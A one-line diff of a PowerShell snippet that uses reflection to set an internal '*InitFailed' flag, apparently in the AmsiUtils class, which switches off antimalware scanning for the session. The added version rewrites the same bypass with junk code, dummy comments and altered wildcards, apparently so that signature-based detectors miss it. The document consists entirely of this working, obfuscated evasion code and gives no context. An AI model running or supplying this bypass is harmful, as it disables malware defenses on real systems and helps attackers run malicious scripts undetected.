@@ -1,1 +1,1 @@
-$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true)
+function IdonTCarE(){$a = 15651465 +488648 - 55555 +5;};<# tets #>;$Test=IdonTCarE;Foreach($AAAAAAAAAAA in [Ref].Assembly.GetTypes()) {if ($AAAAAAAAAAA.Name -like "A*iUt*ls") {$c=$AAAAAAAAAAA}};<# echo "yest"; #> $d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true)
